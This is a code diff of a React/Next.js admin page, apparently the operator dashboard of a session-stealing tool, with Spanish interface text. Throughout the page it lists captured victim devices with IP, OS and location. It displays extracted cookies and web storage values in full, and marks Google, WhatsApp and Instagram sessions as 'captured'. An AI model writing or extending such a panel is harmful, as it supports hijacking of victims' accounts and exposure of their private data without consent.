@@ -1,238 +1,347 @@
-﻿"use client";
+"use client";
 
-import React, { useEffect, useState } from "react";
-import GlassCard from "@/components/GlassCard";
+import React, { useState, useEffect } from 'react';
 import { 
-  Database, Users, Shield, Clock, ExternalLink, Facebook, Instagram, Twitter, MessageSquare, Play, Mail, Bot, Globe, AlertCircle, ShoppingCart, GraduationCap, Monitor, MapPin, Trash2, Smartphone, Zap, ChevronRight
-} from "lucide-react";
-import Link from "next/link";
-import { supabase, SessionSnapshot } from "@/lib/supabase";
+  Monitor, Laptop, Smartphone, Globe, ShieldCheck, ShieldAlert, 
+  Database, Search, MapPin, Activity, Clock, Cpu, Cookie, Trash2 
+} from 'lucide-react';
+import { supabase, SessionSnapshot, Cookie as CookieType } from '@/lib/supabase';
 
-const isNew = (date: string) => {
-  const diff = Date.now() - new Date(date).getTime();
-  return diff < 15 * 60 * 1000; // 15 minutos
-};
-
-const formatRelativeTime = (date: string) => {
-  const now = new Date();
-  const captured = new Date(date);
-  const diffInSeconds = Math.floor((now.getTime() - captured.getTime()) / 1000);
-  if (diffInSeconds < 60) return "ahora mismo";
-  if (diffInSeconds < 3600) return `${Math.floor(diffInSeconds / 60)}m`;
-  if (diffInSeconds < 86400) return `${Math.floor(diffInSeconds / 3600)}h`;
-  return captured.toLocaleDateString();
-};
-
-export default function Home() {
-  const [stats, setStats] = useState([
-    { label: "Total Sessions", value: "---", icon: Database, color: "text-blue-500" },
-    { label: "Unique Users", value: "---", icon: Users, color: "text-purple-500" },
-    { label: "Live Snapshots", value: "---", icon: Shield, color: "text-emerald-500" },
-    { label: "Last Capture", value: "---", icon: Clock, color: "text-amber-500" },
-  ]);
-  const [activeDevices, setActiveDevices] = useState<any[]>([]);
+export default function SessionDashboard() {
+  const [sessions, setSessions] = useState<SessionSnapshot[]>([]);
+  const [selectedSession, setSelectedSession] = useState<SessionSnapshot | null>(null);
+  const [cookies, setCookies] = useState<CookieType[]>([]);
+  const [webStorage, setWebStorage] = useState<any[]>([]);
+  const [searchCookie, setSearchCookie] = useState('');
   const [loading, setLoading] = useState(true);
-  const [deleteProgress, setDeleteProgress] = useState("");
 
   useEffect(() => {
-    fetchDashboardData();
-    const interval = setInterval(fetchDashboardData, 30000);
-    return () => clearInterval(interval);
+    fetchSessions();
   }, []);
 
-  const fetchDashboardData = async () => {
-    try {
-      const { data: allSnapshots } = await supabase
-        .from("session_snapshots")
-        .select("*")
-        .order("captured_at", { ascending: false })
-        .limit(1000);
-
-      if (!allSnapshots) return;
-
-      const grouped: Record<string, any[]> = {};
-      allSnapshots.forEach(s => {
-        const dId = s.device_id || "unknown-node";
-        if (!grouped[dId]) grouped[dId] = [];
-        grouped[dId].push(s);
-      });
-
-      const deviceList = Object.keys(grouped).map(dId => {
-        const devSess = grouped[dId];
-        const latest = devSess[0];
-        return {
-          id: dId,
-          pc_name: latest.pc_name || "Unknown Agent",
-          os: latest.os || "Unknown OS",
-          ip: latest.ip_address || "0.0.0.0",
-          location: latest.location_city ? `${latest.location_city}, ${latest.location_country || ""}` : "Remote",
-          lastSeen: latest.captured_at,
-          count: devSess.length,
-          hasNew: devSess.some(s => isNew(s.captured_at))
-        };
-      });
-
-      setActiveDevices(deviceList.slice(0, 5));
-
-      const uniqueUsers = new Set(allSnapshots.map(u => u.user_id)).size;
-      const lastCapture = allSnapshots.length > 0 ? allSnapshots[0].captured_at : "---";
-
-      setStats([
-        { label: "Intelligence Nodes", value: deviceList.length.toString(), icon: Database, color: "text-blue-500" },
-        { label: "Unique Agents", value: uniqueUsers.toString(), icon: Users, color: "text-purple-500" },
-        { label: "Active Captures", value: allSnapshots.length.toLocaleString(), icon: Shield, color: "text-emerald-500" },
-        { label: "Last Transmission", value: lastCapture !== "---" ? formatRelativeTime(lastCapture) : "---", icon: Clock, color: "text-amber-500" },
-      ]);
-
-    } catch (error) {
-      console.error("Dashboard fetch error:", error);
-    } finally {
-      setLoading(false);
+  const fetchSessions = async () => {
+    setLoading(true);
+    const { data, error } = await supabase
+      .from('session_snapshots')
+      .select('*')
+      .order('captured_at', { ascending: false });
+    
+    if (!error && data) {
+      setSessions(data);
+      if (data.length > 0) {
+        setSelectedSession(data[0]);
+      }
     }
+    setLoading(false);
   };
 
-  const deleteAllData = async () => {
-    if (!window.confirm("⚠️ ¿ESTÁS SEGURO? Esta acción vaciará por lotes TODA la base de datos de manera irreversible.")) {
+  useEffect(() => {
+    if (selectedSession) {
+      fetchSessionData(selectedSession.id);
+    }
+  }, [selectedSession]);
+
+  const fetchSessionData = async (snapshotId: string) => {
+    const [cookiesRes, storageRes] = await Promise.all([
+      supabase.from('cookies').select('*').eq('snapshot_id', snapshotId),
+      supabase.from('web_storage').select('*').eq('snapshot_id', snapshotId)
+    ]);
+    if (cookiesRes.data) setCookies(cookiesRes.data);
+    if (storageRes.data) setWebStorage(storageRes.data);
+  };
+
+  const clearDatabase = async () => {
+    if (!window.confirm('¿Estás seguro de que quieres eliminar todos los datos de la base de datos? Esta acción no se puede deshacer.')) {
       return;
     }
-    setLoading(true);
-    setDeleteProgress("IDENTIFICANDO REGISTROS...");
+    
     try {
-      const { data: allIds, error: fetchError } = await supabase.from("session_snapshots").select("id");
-      if (fetchError) throw fetchError;
+      setLoading(true);
+      const { error } = await supabase
+        .from('session_snapshots')
+        .delete()
+        .neq('id', '00000000-0000-0000-0000-000000000000');
       
-      if (allIds && allIds.length > 0) {
-        const ids = allIds.map(i => i.id);
-        const batchSize = 100;
-        const total = ids.length;
-        
-        for (let i = 0; i < ids.length; i += batchSize) {
-          const chunk = ids.slice(i, i + batchSize);
-          setDeleteProgress(`BORRANDO LOTE: ${Math.min(i + batchSize, total)} / ${total}...`);
-          const { error: delError } = await supabase.from("session_snapshots").delete().in("id", chunk);
-          if (delError) throw delError;
-        }
+      if (error) {
+        alert('Error al limpiar la base de datos: ' + error.message);
+      } else {
+        alert('Base de datos limpiada correctamente.');
+        setSessions([]);
+        setSelectedSession(null);
+        setCookies([]);
+        setWebStorage([]);
       }
-      
-      alert("✅ Base de datos vaciada con éxito.");
-      setDeleteProgress("");
-      fetchDashboardData();
-    } catch (err: any) {
-      alert("❌ Error: " + (err.message || "Timeout"));
-      setDeleteProgress("");
+    } catch (err) {
+      alert('Error: ' + err.message);
     } finally {
       setLoading(false);
     }
   };
 
+  // Helpers
+  const getDeviceIcon = (os?: string) => {
+    if (!os) return <Monitor className="w-5 h-5" />;
+    const lowerOs = os.toLowerCase();
+    if (lowerOs.includes('mac') || lowerOs.includes('windows')) return <Laptop className="w-5 h-5" />;
+    if (lowerOs.includes('android') || lowerOs.includes('ios')) return <Smartphone className="w-5 h-5" />;
+    return <Monitor className="w-5 h-5" />;
+  };
+
+  const checkPlatformStatus = (domain: string) => {
+    return cookies.some(c => c.domain.includes(domain)) || webStorage.some(s => s.domain.includes(domain));
+  };
+
+  const filteredCookies = cookies.filter(c => 
+    c.name.toLowerCase().includes(searchCookie.toLowerCase()) || 
+    c.domain.toLowerCase().includes(searchCookie.toLowerCase())
+  );
+
   return (
-    <div className="space-y-8">
-      <header className="flex flex-col gap-2">
-        <h2 className="text-4xl font-black tracking-tight text-white/90">System Overview</h2>
-        <p className="text-gray-500 font-medium tracking-wide uppercase text-xs">Multi-Device Intelligence & Real-Time Monitoring</p>
-      </header>
-
-      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
-        {stats.map((stat, idx) => (
-          <GlassCard key={stat.label} delay={idx * 0.1} className="flex items-center gap-5 p-6 border-white/5 hover:border-white/10 transition-all">
-            <div className={`w-14 h-14 rounded-[1.25rem] bg-black/40 flex items-center justify-center shadow-inner border border-white/5 ${stat.color}`}>
-              <stat.icon size={28} />
-            </div>
-            <div>
-              <p className="text-[10px] font-black text-gray-500 uppercase tracking-widest mb-0.5">{stat.label}</p>
-              <p className="text-3xl font-black text-white tracking-tighter">{stat.value}</p>
-            </div>
-          </GlassCard>
-        ))}
-      </div>
-
-      <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
-        <GlassCard delay={0.4} className="lg:col-span-2 p-0 overflow-hidden relative">
-          <div className="p-8 border-b border-white/5 bg-white/[0.02] flex items-center justify-between">
-            <h3 className="text-sm font-black uppercase tracking-[0.3em] text-white/40">Active Intel Nodes (By PC)</h3>
-            <div className="flex items-center gap-2 text-[10px] font-black text-blue-400 bg-blue-400/10 px-3 py-1.5 rounded-full border border-blue-400/20 shadow-sm">
-                <div className="w-1.5 h-1.5 rounded-full bg-blue-400 animate-pulse" /> LIVE SYNC
-            </div>
+    <div className="flex h-screen bg-[#0A0E17] text-gray-200 font-sans selection:bg-indigo-500/30">
+      
+      {/* SIDEBAR IZQUIERDO */}
+      <aside className="w-80 bg-[#111827] border-r border-gray-800 flex flex-col z-20">
+        <div className="p-6 border-b border-gray-800 flex justify-between items-center">
+          <div>
+            <h1 className="text-xl font-bold text-white flex items-center gap-3">
+              <ShieldAlert className="w-6 h-6 text-indigo-500" />
+              Nexus Admin
+            </h1>
+            <p className="text-xs text-gray-400 mt-1 uppercase tracking-widest font-semibold">
+              Reconnaissance Center
+            </p>
           </div>
-          <div className="divide-y divide-white/5">
-            {loading ? (
-               [1,2,3,4,5].map(i => <div key={i} className="h-20 bg-white/5 animate-pulse" />)
-            ) : activeDevices.length > 0 ? (
-              activeDevices.map((device, idx) => (
-                <Link 
-                  key={device.id} 
-                  href={`/device/${device.id}`}
-                  className="flex items-center justify-between p-7 hover:bg-white/[0.03] transition-all group border-l-4 border-transparent hover:border-blue-500 relative"
-                >
-                  <div className="flex items-center gap-6">
-                    <div className="w-12 h-12 rounded-2xl bg-blue-500/10 flex items-center justify-center text-blue-400 shadow-inner group-hover:scale-110 transition-transform relative">
-                      <Monitor size={20} />
-                      {device.hasNew && <div className="absolute -top-1 -right-1 w-3 h-3 bg-emerald-500 rounded-full animate-ping" />}
-                    </div>
-                    <div>
-                      <div className="flex items-center gap-3">
-                        <p className="font-black text-white/90 text-lg uppercase tracking-wider">{device.pc_name}</p>
-                        {device.hasNew && <span className="text-[8px] font-black bg-emerald-500 text-white px-2 py-0.5 rounded-full shadow-lg shadow-emerald-500/20">NUEVO</span>}
-                      </div>
-                      <p className="text-xs text-gray-500 font-bold uppercase tracking-wider flex items-center gap-2">
-                        <MapPin size={12}/> {device.location} | <span className="text-blue-400/60">{device.ip}</span>
-                      </p>
-                    </div>
-                  </div>
-                  <div className="flex items-center gap-6">
-                    <div className="text-right">
-                      <p className="text-[10px] font-black text-gray-600 uppercase tracking-widest">{device.os}</p>
-                      <p className="text-[9px] font-bold text-blue-400 uppercase tracking-widest">{formatRelativeTime(device.lastSeen)} ago</p>
-                    </div>
-                    <ChevronRight size={18} className="text-gray-700 group-hover:text-blue-400 transition-transform group-hover:translate-x-1" />
-                  </div>
-                </Link>
-              ))
-            ) : (
-                <div className="p-20 text-center text-gray-500 font-bold uppercase tracking-widest text-xs">No devices detected.</div>
-            )}
-          </div>
-        </GlassCard>
-
-        <div className="space-y-8">
-          <GlassCard delay={0.5} className="p-8 border-t-4 border-blue-500 shadow-2xl">
-            <h3 className="text-[11px] font-black uppercase tracking-[0.25em] text-white/30 mb-6">Operations Hub</h3>
-            <div className="grid gap-4">
-              <Link 
-                href="/sessions"
-                className="flex items-center justify-center w-full py-5 px-6 rounded-[1.5rem] bg-blue-600 hover:bg-blue-500 transition-all font-black text-sm uppercase tracking-widest text-white shadow-2xl shadow-blue-500/20 active:scale-95"
-              >
-                Access Archives
-              </Link>
-              <button onClick={deleteAllData} className="w-full py-5 px-6 rounded-[1.5rem] bg-red-500/10 hover:bg-red-500/20 transition-all font-black text-xs uppercase tracking-[0.2em] text-red-500 border border-red-500/20 flex items-center justify-center gap-2">
-                <Trash2 size={16} /> WIPE DATABASE
-              </button>
-              {deleteProgress && (
-                <div className="text-[9px] font-black text-red-400 uppercase tracking-widest animate-pulse text-center">{deleteProgress}</div>
-              )}
-            </div>
-          </GlassCard>
-
-          <GlassCard delay={0.6} className="p-8">
-            <h3 className="text-[11px] font-black uppercase tracking-[0.25em] text-white/30 mb-6 flex items-center justify-between">Intel Status <Zap size={14} className="text-emerald-500 animate-pulse"/></h3>
-            <div className="space-y-6">
-              <div className="flex items-center justify-between text-[11px] font-black tracking-widest">
-                <span className="text-gray-500 uppercase">Live Transmission</span>
-                <span className="text-emerald-400 flex items-center gap-2">
-                  <div className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse shadow-[0_0_8px_rgba(52,211,153,0.5)]" />
-                  ACTIVE
-                </span>
-              </div>
-              <div className="p-4 bg-white/[0.02] border border-white/5 rounded-2xl">
-                 <p className="text-[9px] font-black text-gray-500 uppercase mb-2">Network Load</p>
-                 <div className="w-full bg-black/40 rounded-full h-1.5 overflow-hidden">
-                    <div className="bg-blue-500 h-full w-[12%] rounded-full animate-pulse" />
-                 </div>
-              </div>
-            </div>
-          </GlassCard>
+          <button onClick={fetchSessions} className="p-2 hover:bg-gray-800 rounded-full transition-colors" title="Actualizar">
+            <Activity className={`w-4 h-4 text-indigo-400 ${loading ? 'animate-spin' : ''}`} />
+          </button>
         </div>
-      </div>
+
+        <div className="flex-1 overflow-y-auto p-4 space-y-2 scrollbar-thin scrollbar-thumb-gray-700">
+          <h2 className="text-xs font-semibold text-gray-500 uppercase tracking-wider mb-3 px-2">
+            Dispositivos Capturados ({sessions.length})
+          </h2>
+          {sessions.map((session) => (
+            <button
+              key={session.id}
+              onClick={() => setSelectedSession(session)}
+              className={`w-full text-left p-3 rounded-xl transition-all duration-200 border ${
+                selectedSession?.id === session.id
+                  ? 'bg-indigo-500/10 border-indigo-500/50 shadow-[0_0_15px_rgba(99,102,241,0.1)]'
+                  : 'bg-transparent border-transparent hover:bg-gray-800/50 hover:border-gray-700'
+              }`}
+            >
+              <div className="flex items-center gap-3">
+                <div className={`p-2 rounded-lg ${selectedSession?.id === session.id ? 'bg-indigo-500/20 text-indigo-400' : 'bg-gray-800 text-gray-400'}`}>
+                  {getDeviceIcon(session.os)}
+                </div>
+                <div className="flex-1 truncate">
+                  <h3 className="font-medium text-sm text-gray-100 truncate">{session.pc_name || session.device_id || 'Unknown Device'}</h3>
+                  <p className="text-xs text-gray-400 flex items-center gap-1 mt-0.5">
+                    <MapPin className="w-3 h-3" />
+                    {session.location_city || 'Desconocido'}, {session.location_country || 'Desconocido'}
+                  </p>
+                </div>
+                {selectedSession?.id === session.id && (
+                  <div className="w-2 h-2 rounded-full bg-indigo-500 animate-pulse" />
+                )}
+              </div>
+            </button>
+          ))}
+          {sessions.length === 0 && !loading && (
+            <p className="text-xs text-gray-500 px-2 py-4 text-center">No hay sesiones registradas.</p>
+          )}
+        </div>
+        {/* BOTÓN LIMPIAR BASE DE DATOS */}
+        <div className="p-4 border-t border-gray-800 bg-[#0E131F]">
+          <button
+            onClick={clearDatabase}
+            className="w-full py-2.5 px-4 bg-red-950/30 hover:bg-red-900/40 text-red-400 hover:text-red-300 border border-red-900/30 hover:border-red-700/50 rounded-xl text-sm font-medium transition-all duration-200 flex items-center justify-center gap-2 shadow-[0_0_10px_rgba(239,68,68,0.05)]"
+          >
+            <Trash2 className="w-4 h-4" />
+            Limpiar Base de Datos
+          </button>
+        </div>
+      </aside>
+
+      {/* MAIN VIEW */}
+      <main className="flex-1 flex flex-col h-screen overflow-hidden relative">
+        {/* Fondo decorativo (Glow) */}
+        <div className="absolute top-0 left-1/2 -translate-x-1/2 w-3/4 h-64 bg-indigo-500/5 rounded-full blur-[120px] pointer-events-none" />
+
+        {selectedSession ? (
+          <div className="flex-1 overflow-y-auto p-8 z-10 scrollbar-thin scrollbar-thumb-gray-800">
+            
+            {/* Header de la sesión */}
+            <div className="mb-8 flex justify-between items-end">
+              <div>
+                <h2 className="text-3xl font-bold text-white tracking-tight flex items-center gap-3">
+                  {selectedSession.pc_name || selectedSession.device_id || 'Dispositivo'}
+                  <span className="text-xs font-medium px-2.5 py-1 bg-green-500/10 text-green-400 rounded-full border border-green-500/20 flex items-center gap-1.5">
+                    <span className="w-1.5 h-1.5 rounded-full bg-green-500"></span>
+                    Online
+                  </span>
+                </h2>
+                <p className="text-sm text-gray-400 mt-2 flex items-center gap-2">
+                  <Clock className="w-4 h-4" />
+                  Última captura: {new Date(selectedSession.captured_at).toLocaleString()}
+                </p>
+              </div>
+            </div>
+
+            {/* Top Cards Grid */}
+            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 mb-8">
+              
+              {/* Tarjeta de Red & Sistema */}
+              <div className="bg-[#111827]/80 backdrop-blur-md border border-gray-800 rounded-2xl p-6 shadow-xl">
+                <div className="flex items-center gap-3 mb-5 pb-4 border-b border-gray-800">
+                  <Activity className="w-5 h-5 text-blue-400" />
+                  <h3 className="font-semibold text-gray-200">Huella de Red & SO</h3>
+                </div>
+                <div className="space-y-4">
+                  <div className="flex justify-between items-center">
+                    <span className="text-gray-500 text-sm">Dirección IP</span>
+                    <span className="font-mono text-sm text-blue-400">{selectedSession.ip_address || 'N/A'}</span>
+                  </div>
+                  <div className="flex justify-between items-center">
+                    <span className="text-gray-500 text-sm flex items-center gap-2"><Cpu className="w-4 h-4"/> OS</span>
+                    <span className="text-sm text-gray-200">{selectedSession.os || 'N/A'}</span>
+                  </div>
+                  <div className="flex justify-between items-center">
+                    <span className="text-gray-500 text-sm flex items-center gap-2"><Globe className="w-4 h-4"/> Ubicación</span>
+                    <span className="text-sm text-gray-200">{selectedSession.location_city || 'N/A'}, {selectedSession.location_country || 'N/A'}</span>
+                  </div>
+                </div>
+              </div>
+
+              {/* Tarjeta de Plataformas Clave */}
+              <div className="lg:col-span-2 bg-[#111827]/80 backdrop-blur-md border border-gray-800 rounded-2xl p-6 shadow-xl">
+                <div className="flex items-center gap-3 mb-5 pb-4 border-b border-gray-800">
+                  <ShieldCheck className="w-5 h-5 text-emerald-400" />
+                  <h3 className="font-semibold text-gray-200">Estado de Plataformas</h3>
+                </div>
+                <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
+                  {[
+                    { name: 'Google', domain: 'google.com', icon: 'G' },
+                    { name: 'WhatsApp', domain: 'whatsapp.com', icon: 'W' },
+                    { name: 'Instagram', domain: 'instagram.com', icon: 'I' }
+                  ].map(platform => {
+                    const isCaptured = checkPlatformStatus(platform.domain);
+                    return (
+                      <div key={platform.name} className="bg-gray-900/50 border border-gray-800/50 rounded-xl p-4 flex items-center gap-4">
+                        <div className={`w-10 h-10 rounded-lg flex items-center justify-center font-bold text-lg ${
+                          isCaptured ? 'bg-emerald-500/10 text-emerald-400' : 'bg-gray-800 text-gray-600'
+                        }`}>
+                          {platform.icon}
+                        </div>
+                        <div>
+                          <p className="font-medium text-sm text-gray-200">{platform.name}</p>
+                          <p className={`text-xs mt-0.5 ${isCaptured ? 'text-emerald-400' : 'text-gray-500'}`}>
+                            {isCaptured ? '✓ Sesión Capturada' : 'No detectado'}
+                          </p>
+                        </div>
+                      </div>
+                    )
+                  })}
+                </div>
+              </div>
+
+            </div>
+
+            {/* Sección de Datos Crudos (Cookies & Storage) */}
+            <div className="grid grid-cols-1 xl:grid-cols-2 gap-6">
+              
+              {/* Tabla de Cookies */}
+              <div className="bg-[#111827]/80 backdrop-blur-md border border-gray-800 rounded-2xl flex flex-col overflow-hidden h-[500px]">
+                <div className="p-5 border-b border-gray-800 flex justify-between items-center bg-gray-900/30">
+                  <h3 className="font-semibold text-gray-200 flex items-center gap-2">
+                    <Cookie className="w-4 h-4 text-orange-400" />
+                    Cookies Extraídas
+                    <span className="text-xs bg-gray-800 px-2 py-0.5 rounded-full text-gray-400">{cookies.length}</span>
+                  </h3>
+                  <div className="relative">
+                    <Search className="w-4 h-4 absolute left-3 top-1/2 -translate-y-1/2 text-gray-500" />
+                    <input 
+                      type="text" 
+                      placeholder="Buscar por nombre o dominio..." 
+                      value={searchCookie}
+                      onChange={(e) => setSearchCookie(e.target.value)}
+                      className="bg-gray-900 border border-gray-700 text-sm rounded-lg focus:ring-indigo-500 focus:border-indigo-500 block w-full pl-9 p-2 placeholder-gray-500"
+                    />
+                  </div>
+                </div>
+                <div className="flex-1 overflow-auto scrollbar-thin scrollbar-thumb-gray-700 p-0">
+                  <table className="w-full text-sm text-left text-gray-400">
+                    <thead className="text-xs text-gray-500 uppercase bg-gray-900/50 sticky top-0">
+                      <tr>
+                        <th className="px-6 py-3 font-medium">Dominio</th>
+                        <th className="px-6 py-3 font-medium">Nombre</th>
+                        <th className="px-6 py-3 font-medium">Valor</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                      {filteredCookies.map((cookie) => (
+                        <tr key={cookie.id} className="border-b border-gray-800/50 hover:bg-gray-800/30 transition-colors">
+                          <td className="px-6 py-3 text-gray-300">{cookie.domain}</td>
+                          <td className="px-6 py-3 font-mono text-indigo-300">{cookie.name}</td>
+                          <td className="px-6 py-3 font-mono text-xs max-w-[150px] truncate" title={cookie.value}>
+                            {cookie.value}
+                          </td>
+                        </tr>
+                      ))}
+                      {filteredCookies.length === 0 && (
+                        <tr>
+                          <td colSpan={3} className="px-6 py-8 text-center text-gray-500">
+                            No se encontraron cookies.
+                          </td>
+                        </tr>
+                      )}
+                    </tbody>
+                  </table>
+                </div>
+              </div>
+
+              {/* Visor Web Storage */}
+              <div className="bg-[#111827]/80 backdrop-blur-md border border-gray-800 rounded-2xl flex flex-col overflow-hidden h-[500px]">
+                <div className="p-5 border-b border-gray-800 bg-gray-900/30">
+                  <h3 className="font-semibold text-gray-200 flex items-center gap-2">
+                    <Database className="w-4 h-4 text-purple-400" />
+                    Web Storage (Local / IndexedDB)
+                    <span className="text-xs bg-gray-800 px-2 py-0.5 rounded-full text-gray-400">{webStorage.length}</span>
+                  </h3>
+                </div>
+                <div className="flex-1 overflow-auto scrollbar-thin scrollbar-thumb-gray-700 p-5 space-y-4">
+                  {webStorage.map((item) => (
+                    <div key={item.id} className="bg-gray-900/50 border border-gray-800 rounded-xl p-4">
+                      <div className="flex justify-between items-start mb-2">
+                        <span className="text-xs font-semibold uppercase tracking-wider text-purple-400">{item.domain}</span>
+                        <span className="text-xs font-mono bg-gray-800 px-2 py-1 rounded text-gray-300">{item.key}</span>
+                      </div>
+                      <div className="bg-black/50 p-3 rounded-lg border border-gray-800">
+                        <pre className="text-xs font-mono text-gray-400 whitespace-pre-wrap break-all">
+                          {item.value}
+                        </pre>
+                      </div>
+                    </div>
+                  ))}
+                  {webStorage.length === 0 && (
+                    <div className="h-full flex flex-col items-center justify-center text-gray-500 gap-3">
+                      <Database className="w-10 h-10 opacity-20" />
+                      <p>No hay datos de storage capturados</p>
+                    </div>
+                  )}
+                </div>
+              </div>
+
+            </div>
+          </div>
+        ) : (
+          <div className="flex-1 flex flex-col items-center justify-center text-gray-500 z-10">
+            <ShieldAlert className="w-16 h-16 mb-4 opacity-20" />
+            <p className="text-lg font-medium">Selecciona una sesión en el panel lateral</p>
+            <p className="text-sm opacity-70">Para ver los datos detallados del dispositivo</p>
+          </div>
+        )}
+      </main>
     </div>
   );
 }
